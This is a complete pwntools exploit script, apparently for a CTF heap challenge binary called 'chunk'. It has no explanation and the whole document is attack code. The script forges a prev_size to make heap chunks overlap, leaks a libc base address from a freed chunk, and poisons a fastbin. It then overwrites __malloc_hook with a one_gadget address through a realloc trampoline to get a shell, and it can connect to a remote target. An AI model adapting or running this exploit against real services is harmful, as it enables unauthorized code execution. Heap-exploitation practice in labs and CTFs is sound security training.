#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./chunk')
if local:
    p = process('./chunk')
    libc = elf.libc
else:
    p = remote('172.16.229.161',7777)
    libc = ELF('./libc.so.6')
#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))
def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def malloc(index,size):
    ru("Your choice: ")
    sl('1')
    ru("Give me a book ID: ")
    sl(str(index))
    ru("how long: ")
    sl(str(size))
def free(index):
    ru("Your choice: ")
    sl('3')
    ru("Which one to throw?")
    sl(str(index))
def show(index):
    ru("Your choice: ")
    sl('2')
    ru("Which book do you want to show?")
    sl(str(index))
def edit(index,content):
	ru("Your choice: ")
	sl('4')
	ru("Which book to write?")
	sl(str(index))
	ru("Content: ")
	sl(content)

malloc(0,0x90)
malloc(1,0x68)
malloc(3,0x68)
malloc(4,0xf8)
malloc(5,0x20)
free(0)
py = ''
py += 'a'*0x60
py += p64(0x180)
edit(3,py)
free(4)
# debug(0)
malloc(5,0x90)
show(5)
ru('Content: ')
libc_base = u64(rc(6).ljust(8,'\x00'))-0x3c4b78-0x270
print "libc_base--->" + hex(libc_base)
onegadget = libc_base + 0xf1147
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym["realloc"]
malloc(6,0x68)
free(1)
edit(6,p64(malloc_hook-0x23))
malloc(7,0x68)
malloc(8,0x68)
py = ''
py += 'a'*11 + p64(onegadget) + p64(realloc+2)
edit(8,py)
# debug(0x0CC9)
malloc(9,0x68)

p.interactive()